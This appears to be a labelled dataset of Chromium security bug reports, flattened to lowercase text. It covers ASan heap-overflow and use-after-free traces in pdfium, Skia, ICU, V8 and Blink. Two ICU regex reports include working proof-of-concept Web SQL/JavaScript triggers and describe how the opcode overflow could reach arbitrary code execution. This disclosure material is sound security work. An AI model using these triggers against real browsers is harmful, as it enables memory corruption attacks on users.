heap-buffer-overflow in opj_dwt_decode vulnerability details the attached testcase crashes the latest asan build of pdfium_test 27481==error addresssanitizer heap-buffer-overflow on address at pc bp sp write of size 4 at thread t0 0 in opj_dwt_interleave_h home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/dwt.c:248:7 1 in opj_dwt_decode_tile home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/dwt.c:594:0 2 in opj_dwt_decode home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/dwt.c:475:0 3 in opj_tcd_dwt_decode home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/tcd.c:1558:31 4 in opj_tcd_decode_tile home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/tcd.c:1250:0 5 in opj_j2k_decode_tile home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/j2k.c:7661:15 6 in opj_j2k_decode_tiles home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/j2k.c:9177:23 7 in opj_j2k_exec home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/j2k.c:7048:41 8 in opj_j2k_decode home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/j2k.c:9368:0 9 in opj_decode home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/openjpeg.c:413:10 10 in cjpx_decoder init unsigned char const int home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fxcodec/codec/fx_codec_jpx_opj.cpp:624:15 11 in ccodec_jpxmodule createdecoder unsigned char const unsigned int int home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fxcodec/codec/fx_codec_jpx_opj.cpp:764:10 12 in cpdf_dibsource loadjpxbitmap home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:643:21 13 in cpdf_dibsource createdecoder home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:599:9 14 in cpdf_dibsource startloaddibsource cpdf_document cpdf_stream const int cpdf_dictionary cpdf_dictionary int unsigned int int home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:335:15 15 in cpdf_imagecache startgetcachedbitmap cpdf_dictionary cpdf_dictionary int unsigned int int cpdf_renderstatus int int home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_cache.cpp:310:15 16 in cpdf_pagerendercache startgetcachedbitmap cpdf_stream int unsigned int int cpdf_renderstatus int int home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_cache.cpp:131:15 17 in cpdf_progressiveimageloaderhandle start cpdf_imageloader cpdf_imageobject const cpdf_pagerendercache int unsigned int int cpdf_renderstatus int int home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:1489:15 18 in cpdf_imageloader startloadimage cpdf_imageobject const cpdf_pagerendercache void int unsigned int int cpdf_renderstatus int int home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:1549:19 19 in cpdf_imagerenderer startloaddibsource home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_image.cpp:371:9 20 in cpdf_imagerenderer start cpdf_renderstatus cpdf_pageobject const cfx_matrix const int int home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_image.cpp:525:9 21 in cpdf_renderstatus continuesingleobject cpdf_pageobject const cfx_matrix const ifx_pause home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render.cpp:350:14 22 in cpdf_progressiverenderer continue ifx_pause home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render.cpp:1175:21 23 in cpdf_progressiverenderer start cpdf_rendercontext cfx_renderdevice cpdf_renderoptions const ifx_pause int home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render.cpp:1114:5 24 in fpdf_renderpage_retail crendercontext void int int int int int int int ifsdk_pause_adapter home/bobthebuilder/chromium/src/out/release third_party/pdfium/fpdfsdk/src/fpdfview.cpp:772:2 25 in fpdf_renderpagebitmap home/bobthebuilder/chromium/src/out/release third_party/pdfium/fpdfsdk/src/fpdfview.cpp:574:2 26 in renderpdf char const char const unsigned int outputformat home/bobthebuilder/chromium/src/out/release third_party/pdfium/samples/pdfium_test.cc:324:5 27 in main home/bobthebuilder/chromium/src/out/release third_party/pdfium/samples/pdfium_test.cc:406:7 28 in libc_start_main 29 in start 0:0 is located 4 bytes to the right of 404-byte region allocated by thread t0 here 0 in memalign asan_rtl_:3 1 in opj_dwt_decode_tile home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/dwt.c:572:2 2 in opj_dwt_decode home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/dwt.c:475:0 3 in opj_tcd_dwt_decode home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/tcd.c:1558:31 4 in opj_tcd_decode_tile home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/tcd.c:1250:0 5 in opj_j2k_decode_tile home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/j2k.c:7661:15 6 in opj_j2k_decode_tiles home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/j2k.c:9177:23 7 in opj_j2k_exec home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/j2k.c:7048:41 8 in opj_j2k_decode home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/j2k.c:9368:0 9 in opj_decode home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/openjpeg.c:413:10 10 in cjpx_decoder init unsigned char const int home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fxcodec/codec/fx_codec_jpx_opj.cpp:624:15 11 in ccodec_jpxmodule createdecoder unsigned char const unsigned int int home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fxcodec/codec/fx_codec_jpx_opj.cpp:764:10 12 in cpdf_dibsource loadjpxbitmap home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:643:21 13 in cpdf_dibsource createdecoder home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:599:9 14 in cpdf_dibsource startloaddibsource cpdf_document cpdf_stream const int cpdf_dictionary cpdf_dictionary int unsigned int int home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:335:15 15 in cpdf_imagecache startgetcachedbitmap cpdf_dictionary cpdf_dictionary int unsigned int int cpdf_renderstatus int int home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_cache.cpp:310:15 16 in cpdf_pagerendercache startgetcachedbitmap cpdf_stream int unsigned int int cpdf_renderstatus int int home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_cache.cpp:131:15 17 in cpdf_progressiveimageloaderhandle start cpdf_imageloader cpdf_imageobject const cpdf_pagerendercache int unsigned int int cpdf_renderstatus int int home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:1489:15 18 in cpdf_imageloader startloadimage cpdf_imageobject const cpdf_pagerendercache void int unsigned int int cpdf_renderstatus int int home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:1549:19 19 in cpdf_imagerenderer startloaddibsource home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_image.cpp:371:9 20 in cpdf_imagerenderer start cpdf_renderstatus cpdf_pageobject const cfx_matrix const int int home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_image.cpp:525:9 21 in cpdf_renderstatus continuesingleobject cpdf_pageobject const cfx_matrix const ifx_pause home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render.cpp:350:14 22 in cpdf_progressiverenderer continue ifx_pause home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render.cpp:1175:21 23 in cpdf_progressiverenderer start cpdf_rendercontext cfx_renderdevice cpdf_renderoptions const ifx_pause int home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render.cpp:1114:5 24 in fpdf_renderpage_retail crendercontext void int int int int int int int ifsdk_pause_adapter home/bobthebuilder/chromium/src/out/release third_party/pdfium/fpdfsdk/src/fpdfview.cpp:772:2 25 in fpdf_renderpagebitmap home/bobthebuilder/chromium/src/out/release third_party/pdfium/fpdfsdk/src/fpdfview.cpp:574:2 26 in renderpdf char const char const unsigned int outputformat home/bobthebuilder/chromium/src/out/release third_party/pdfium/samples/pdfium_test.cc:324:5 27 in main home/bobthebuilder/chromium/src/out/release third_party/pdfium/samples/pdfium_test.cc:406:7 28 in libc_start_main summary addresssanitizer heap-buffer-overflow 0 shadow bytes around the buggy address fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 container overflow fc array cookie ac asan internal fe 27481==aborting version chrome version latest asan build of pdfium_test reproduction case attached in repro.pdf	7
heap-buffer-overflow in void skmatrixconvolutionimagefilter filterpixels clamppixelfetcher false tested on os ubuntu 12.04 chromium 39.0.2170.0 developer build revision 6128c200e138d3d7c52aae5e01d0af36a48b1706-refs/heads/master 296715 the repro-file is inside tar.gz package because chrome crashes every time i try to attach the file also ubuntu nautilus will crash with a null-pointer crash if you try to access the folder where the file is asan-report 6564==error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 4 at thread t7 compositorraste 0 in void skmatrixconvolutionimagefilter filterpixels clamppixelfetcher false skbitmap const skbitmap skirect const skirect const const b/build/slave/asan_release__symbolized_/build/src/out/release third_party/skia/src/effects/skmatrixconvolutionimagefilter.cpp:197 1 in skmatrixconvolutionimagefilter onfilterimage skimagefilter proxy skbitmap const skimagefilter context const skbitmap skipoint const b/build/slave/asan_release__symbolized_/build/src/out/release third_party/skia/src/effects/skmatrixconvolutionimagefilter.cpp:328 2 in skimagefilter filterimage skimagefilter proxy skbitmap const skimagefilter context const skbitmap skipoint const b/build/slave/asan_release__symbolized_/build/src/out/release third_party/skia/src/core/skimagefilter.cpp:186 3 in skcolorfilterimagefilter onfilterimage skimagefilter proxy skbitmap const skimagefilter context const skbitmap skipoint const b/build/slave/asan_release__symbolized_/build/src/out/release third_party/skia/src/effects/skcolorfilterimagefilter.cpp:114 4 in skimagefilter filterimage skimagefilter proxy skbitmap const skimagefilter context const skbitmap skipoint const b/build/slave/asan_release__symbolized_/build/src/out/release third_party/skia/src/core/skimagefilter.cpp:186 5 in skcanvas internaldrawdevice skbasedevice int int skpaint const b/build/slave/asan_release__symbolized_/build/src/out/release third_party/skia/src/core/skcanvas.cpp:1227 6 in skcanvas internalrestore b/build/slave/asan_release__symbolized_/build/src/out/release third_party/skia/src/core/skcanvas.cpp:1009 7 in skcanvas restore b/build/slave/asan_release__symbolized_/build/src/out/release third_party/skia/src/core/skcanvas.cpp:979 is located 0 bytes to the right of 1-byte region allocated by thread t0 chrome here 0 in operator new unsigned long 0 1 in skmatrixconvolutionimagefilter skmatrixconvolutionimagefilter sktsize int const float const float float skipoint const skmatrixconvolutionimagefilter tilemode bool skimagefilter skimagefilter croprect const unsigned int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/skia/src/effects/skmatrixconvolutionimagefilter.cpp:39 2 in skmatrixconvolutionimagefilter create sktsize int const float const float float skipoint const skmatrixconvolutionimagefilter tilemode bool skimagefilter skimagefilter croprect const unsigned int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/skia/include/effects/skmatrixconvolutionimagefilter.h:65 3 in blink feconvolvematrix createimagefilter blink skiaimagefilterbuilder b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/platform/graphics/filters/feconvolvematrix.cpp:534 4 in blink filtereffect createimagefilterwithoutvalidation blink skiaimagefilterbuilder b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/platform/graphics/filters/filtereffect.cpp:548 5 in blink skiaimagefilterbuilder build blink filtereffect blink colorspace bool b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/platform/graphics/filters/skiaimagefilterbuilder.cpp:71	11
unknown in media container_names determinecontainer detailed report fuzzer cdiehl_peach job type linux_asan_chrome_media crash type unknown crash address crash state media container_names determinecontainer media ffmpegglue opencontext void base internal returnasparamadapter bool minimized testcase 318.09 kb filer inferno	11
unknown in icu_52 regexmatcher matchchunkat vulnerability details the icu regexp engine uses int32 type to represent an opcode in the compiled pattern in this representation the most significant 8 bits encode the opcode type and the remaining 24 bits contain the opcode s optional parameter this is evident from the following macro definitions found in regeximp.h taken from regeximp.h 254 255 convenience macros for assembling and disassembling a compiled operation 256 257 define urx_build type val int32_t type 24 val 258 define urx_type x uint32_t x 24 259 define urx_val x x among all the opcodes defined by icu the one related to this bug is urx_lbn_cont which is emitted by the compiler in response to a negative look-behind assertion according to the following code from regeximp.h and some other sources the urx_lbn_cont opcode has four parameters the first parameter is embedded directly in the lower 24 bits the val portion of the opcode itself while each of the rest three occupies one slot in the compiled pattern taken from regeximp.h 163 urx_lbn_cont 47 negative lookbehind continue 164 param 0 the data location 165 param 1 the minimum length of the look-behind match 166 param 2 the max length of the look-behind match 167 param 3 the pattern loc following the look-behind block now the focus is param 2 the max length of the look-behind match which is where the overflow occurs the value of this parameter is calculated by taken from regexcmp.cpp 2163 determine the min and max bounds for the length of the 2164 string that the pattern can match 2165 an unbounded upper limit is an error 2166 int32_t patend frxpat fcompiledpat size 1 2167 int32_t minml minmatchlength fmatchopenparen patend 2168 int32_t maxml maxmatchlength fmatchopenparen patend and assigned to the compiled pattern by taken from regexcmp.cpp 2175 insert the min and max match len bounds into the urx_lb_cont op that 2176 appears at the top of the look-behind block at location fmatchopenparen+1 2177 frxpat fcompiledpat setelementat minml fmatchopenparen-3 2178 frxpat fcompiledpat setelementat maxml fmatchopenparen-2 neither of them checks the range of the computed maxml variable so if this value is large enough it will overflow the 24-bit val portion and redefine the type of this opcode for example consider the pattern a a 11000 11000 for this pattern the value computed for maxml is 121000001 or obviously an overflow to the most significant 8 bits has occurred now the opcode is of type or urx_nop as defined by the source code from the view point of the regexp engine the following opcodes have been generated slot opcode 0 state_save 2 1 jmp 3 2 fail 3 nop 4 nop 5 lb_start 0 6 lbn_cont 0 7 param 1 8 nop should have been param 2 maxmatchlength 9 param 3 10 nop 11 nop 12 one_char up to now everything is fine as long as the overflowed opcode is interpreted consistently by the regexmatcher as the max length however before the opcode generation phase is done the compiler goes another pass through the compiled pattern looking for opcodes of type urx_nop and stripping them away taken from regexcmp.cpp 307 308 optimization pass 1 nops back-references and case-folding 309 310 stripnops this will remove the urx_nop opcode caused by the overflow and shift the following non-nop opcodes forward now the compiled pattern looks like the following slot opcode 0 state_save 2 1 jmp 3 2 fail 3 lb_start 0 4 lbn_cont 0 5 param 1 6 param 3 used as param 2 maxmatchlength 7 one_char used as param 3 continue loc note how this effectively modifies the 3rd parameter of urx_lbn_cont to which is actually the parameter value of the urx_onechar opcode that follows so if the negative look-behind fails to match the engine will pick up the opcode at index and continue execution from there by changing the character a to another one say ubeef it s possible to control where the regexp engine goes leading to arbitrary regexp opcode execution since there are plenty of opportunities to do memory reads/writes during interpretation of opcodes it is possible to achieve arbitrary machine code execution through this bug version chrome 38.0.2125.111 64-bit stable ubuntu 14.04 lts chrome 39.0.2171.42 64-bit beta ubuntu 14.04 lts chrome 40.0.2202.3 64-bit dev ubuntu 14.04 lts reproduction case html head script var db opendatabase test_db 1.0 test database 1024 db.transaction function tx for i 0 i 1000 i tx.executesql select aaaaabbbbbcccccddddeeeee regexp ubeaf ubeaf 11000 11000 location.reload script head html	7
heap-buffer-overflow in std less std string operator detailed report fuzzer therealholden_worker job type android_asan_chrome crash type heap-buffer-overflow read 4 crash address crash state std less std string operator std priv rb_tree std string std less std string std pair std str storage blobdatahandle std map std string storage blobdatahandle s unminimized testcase additional requirements requires http filer inferno	11
webaudio render that coincides with gc graph mutation can cause snap useragent mozilla/5.0 macintosh intel mac os x 10_9_5 applewebkit/537.36 khtml like gecko chrome/38.0.2125.122 safari/537.36 steps to reproduce the problem 1 run any chrome/chromium version 38 with gc exposed to js with js-flags expose_gc command line option 2 visit js source visible 3 refresh page until crash occurs what is the expected behavior nasty noise is audible tab does n't crash what went wrong nasty noise is audible tab often crashes our production app occasionally crashes for our users who are on stable chrome 38 we have reproduced the crash on chrome versions all the way to canary the test case see jsbin url is my best attempt at producing a small and minimal reproduction script in our app the webaudio crashes occur during seemingly unrelated memory heavy events leading me to believe that this bug is gc related debugging chromium using copious log statements gives further clues that the crash is caused by mutation of the audio node graph by the garbage collector while the audio thread is traversing the graph during an audio render cycle this may or may not be related to and the recent lock-addressing commits and do not solve the issue crashed report id how much crashed just one tab is it a problem with a plugin no did this work before yes chrome 37 pre oilpan changes chrome version 38.0.2125.122 channel stable os version os x 10.9.5 flash version shockwave flash 15.0 r0 crashes on linux windows and mac	11
heap-buffer-overflow in icu_52 regexmatcher matchchunkat vulnerability details the icu regular expression compiler does n't properly handle certain malformed patterns causing incorrect opcodes to be generated when these opcodes are later used by the match engine invalid reads/writes to the heap memory will occur this bug is exposed through the browser s web sql database support and can be reached by using the regexp operator in a web sql statement version verified with the following combinations chrome 38.0.2125.101 64-bit ubuntu 14.04 lts chromium 40.0.2182.0 64-bit asan-instrumented debug and release builds ubuntu 14.04 lts reproduction case for reproduction simply do the following 1 load in the browser html head script var db opendatabase test_db 1.0 test database 1024 db.transaction function tx for i 0 i 1000 i tx.executesql select aaaaabbbbbcccccddddeeeee regexp b b 0 q\\e xxx 3 d location.reload script head html 2 meet the sad tab with asan-instrumented release build of chromium the following log will be printed upon crash asan-linux-release-298668/chrome-wrapper no-sandbox 8391:8391:1012/232409 error browser_main_loop.cc 163 running without the suid sandbox see for more information on developing with the sandbox on 8480:8480:1012/232419 error renderer_main.cc 206 running without renderer sandbox 8484:8484:1012/232419 error renderer_main.cc 206 running without renderer sandbox 8510:8510:1012/232430 error renderer_main.cc 206 running without renderer sandbox 8510==error addresssanitizer heap-buffer-overflow on address at pc bp sp write of size 8 at thread t10 webcore databa 0 home/yang/downloads/asan-linux-release-298668/chrome 1 home/yang/downloads/asan-linux-release-298668/chrome 2 home/yang/downloads/asan-linux-release-298668/chrome 3 home/yang/downloads/asan-linux-release-298668/chrome 4 home/yang/downloads/asan-linux-release-298668/chrome 5 home/yang/downloads/asan-linux-release-298668/chrome 6 home/yang/downloads/asan-linux-release-298668/chrome 7 home/yang/downloads/asan-linux-release-298668/chrome 8 home/yang/downloads/asan-linux-release-298668/chrome 9 home/yang/downloads/asan-linux-release-298668/chrome 10 home/yang/downloads/asan-linux-release-298668/chrome 11 home/yang/downloads/asan-linux-release-298668/chrome 12 home/yang/downloads/asan-linux-release-298668/chrome 13 home/yang/downloads/asan-linux-release-298668/chrome 14 home/yang/downloads/asan-linux-release-298668/chrome 15 home/yang/downloads/asan-linux-release-298668/chrome 16 home/yang/downloads/asan-linux-release-298668/chrome 17 home/yang/downloads/asan-linux-release-298668/chrome 18 home/yang/downloads/asan-linux-release-298668/chrome 19 home/yang/downloads/asan-linux-release-298668/chrome 20 lib/x86_64-linux-gnu/libpthread.so.0 21 lib/x86_64-linux-gnu/libc.so.6 is located 64 bytes to the left of 256-byte region allocated by thread t10 webcore databa here 0 home/yang/downloads/asan-linux-release-298668/chrome 1 home/yang/downloads/asan-linux-release-298668/chrome 2 home/yang/downloads/asan-linux-release-298668/chrome 3 home/yang/downloads/asan-linux-release-298668/chrome 4 home/yang/downloads/asan-linux-release-298668/chrome 5 home/yang/downloads/asan-linux-release-298668/chrome 6 home/yang/downloads/asan-linux-release-298668/chrome 7 home/yang/downloads/asan-linux-release-298668/chrome 8 home/yang/downloads/asan-linux-release-298668/chrome 9 home/yang/downloads/asan-linux-release-298668/chrome 10 home/yang/downloads/asan-linux-release-298668/chrome 11 home/yang/downloads/asan-linux-release-298668/chrome 12 home/yang/downloads/asan-linux-release-298668/chrome 13 home/yang/downloads/asan-linux-release-298668/chrome 14 home/yang/downloads/asan-linux-release-298668/chrome 15 home/yang/downloads/asan-linux-release-298668/chrome 16 home/yang/downloads/asan-linux-release-298668/chrome 17 home/yang/downloads/asan-linux-release-298668/chrome 18 home/yang/downloads/asan-linux-release-298668/chrome 19 home/yang/downloads/asan-linux-release-298668/chrome 20 home/yang/downloads/asan-linux-release-298668/chrome 21 home/yang/downloads/asan-linux-release-298668/chrome 22 lib/x86_64-linux-gnu/libpthread.so.0 thread t10 webcore databa created by t0 chrome here 0 home/yang/downloads/asan-linux-release-298668/chrome 1 home/yang/downloads/asan-linux-release-298668/chrome 2 home/yang/downloads/asan-linux-release-298668/chrome 3 home/yang/downloads/asan-linux-release-298668/chrome 4 home/yang/downloads/asan-linux-release-298668/chrome 5 home/yang/downloads/asan-linux-release-298668/chrome 6 home/yang/downloads/asan-linux-release-298668/chrome 7 home/yang/downloads/asan-linux-release-298668/chrome 8 home/yang/downloads/asan-linux-release-298668/chrome 9 home/yang/downloads/asan-linux-release-298668/chrome 10 home/yang/downloads/asan-linux-release-298668/chrome 11 home/yang/downloads/asan-linux-release-298668/chrome 12 home/yang/downloads/asan-linux-release-298668/chrome 13 home/yang/downloads/asan-linux-release-298668/chrome 14 home/yang/downloads/asan-linux-release-298668/chrome 15 home/yang/downloads/asan-linux-release-298668/chrome 16 unknown module 17 unknown module 18 unknown module 19 unknown module 20 home/yang/downloads/asan-linux-release-298668/chrome 21 home/yang/downloads/asan-linux-release-298668/chrome 22 home/yang/downloads/asan-linux-release-298668/chrome 23 home/yang/downloads/asan-linux-release-298668/chrome 24 home/yang/downloads/asan-linux-release-298668/chrome 25 home/yang/downloads/asan-linux-release-298668/chrome 26 home/yang/downloads/asan-linux-release-298668/chrome 27 home/yang/downloads/asan-linux-release-298668/chrome 28 home/yang/downloads/asan-linux-release-298668/chrome 29 home/yang/downloads/asan-linux-release-298668/chrome 30 home/yang/downloads/asan-linux-release-298668/chrome 31 home/yang/downloads/asan-linux-release-298668/chrome 32 home/yang/downloads/asan-linux-release-298668/chrome 33 home/yang/downloads/asan-linux-release-298668/chrome 34 home/yang/downloads/asan-linux-release-298668/chrome 35 home/yang/downloads/asan-linux-release-298668/chrome 36 home/yang/downloads/asan-linux-release-298668/chrome 37 home/yang/downloads/asan-linux-release-298668/chrome 38 home/yang/downloads/asan-linux-release-298668/chrome 39 home/yang/downloads/asan-linux-release-298668/chrome 40 home/yang/downloads/asan-linux-release-298668/chrome 41 home/yang/downloads/asan-linux-release-298668/chrome 42 home/yang/downloads/asan-linux-release-298668/chrome 43 home/yang/downloads/asan-linux-release-298668/chrome 44 home/yang/downloads/asan-linux-release-298668/chrome 45 home/yang/downloads/asan-linux-release-298668/chrome 46 home/yang/downloads/asan-linux-release-298668/chrome 47 home/yang/downloads/asan-linux-release-298668/chrome 48 home/yang/downloads/asan-linux-release-298668/chrome 49 lib/x86_64-linux-gnu/libc.so.6 summary addresssanitizer heap-buffer-overflow 0 shadow bytes around the buggy address fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 container overflow fc array cookie ac asan internal fe 8510==aborting 8391:8457:1012/232439 error channel.cc 254 rawchannel read error connection broken for debug build of chromium the poc will trigger an assertion failure during compilation of the pattern as shown in the following output full error log is attached below chrome type=renderer no-sandbox enable-deferred-image-decoding lang=en-us force-fieldtrials=prerender/matchcomplete/uma-new-install-uniformity-trial/experiment/uma-session-randomized-uniformity-trial-5-percent/group_11/uma-uniformity-trial-1-percent/group_24/uma-uniformity-trial-10-percent/group_04/uma-uniformity-trial-100-percent/group_01/uma-uniformity-trial-20-percent/group_04/uma-uniformity-trial-5-percent/group_03/uma-uniformity-trial-50-percent/group_01 enable-offline-auto-reload enable-offline-auto-reload-visible-only enable-delegated-renderer enable-impl-side-painting num-raster-threads=1 disable-accelerated-video-decode channel=8007.3.821525718 third_party/icu/source/i18n/regexcmp.cpp:1978 int32_t icu_52 regexcompile blocktoploc ubool assertion uint32_t uint32_t frxpat fcompiledpat elementati theloc 24 urx_nop failed	7
unknown in v8 internal invoke detailed report fuzzer decoder_langfuzz job type linux_asan_d8_dbg crash type unknown crash address crash state v8 internal invoke v8 internal execution call v8 script run regressed v8 r25838:25880 minimized testcase 8.76 kb filer mbarbella	11
check failure in check p issmi failed v8/src/objects-debug.cc 32 detailed report fuzzer decoder_langfuzz job type linux_asan_d8 crash type check failure crash address crash state check p issmi failed v8/src/objects-debug.cc 32 regressed v8 r25384:25389 minimized testcase 8.96 kb filer jarin	9
heap-use-after-free in blink pendingscript stopwatchingforload vulnerability details the testcase consists of multiple files attached as crash.zip it requires to be loaded from a webserver it will crash the latest asan build as follows 22594==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 1 at thread t0 chrome 0 in stopwatchingforload mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/dom/pendingscript.cpp:94 1 in detach mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/dom/scriptloader.cpp:114 2 in scriptrunner mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/dom/scriptrunner.cpp:52 3 in deleteptr mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/wtf/ownptrcommon.h:52 discriminator 20 4 in htmldocument mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/html/htmldocument.cpp:82 5 in postgarbagecollectionprocessing mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/global-handles.cc:272 6 in postgarbagecollectionprocessing mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/global-handles.cc:695 7 in performgarbagecollection mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/heap/heap.cc:1121 8 in collectgarbage mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/heap/heap.cc:844 9 in collectgarbage mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/heap/heap-inl.h:583 10 in idlenotification mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/api.cc:6716 11 in didcommit mnt/data/b/build/slave/asan_release/build/src/out/release content/renderer/gpu/render_widget_compositor.cc:898 12 in beginmainframe mnt/data/b/build/slave/asan_release/build/src/out/release cc/trees/thread_proxy.cc:830 13 in run mnt/data/b/build/slave/asan_release/build/src/out/release 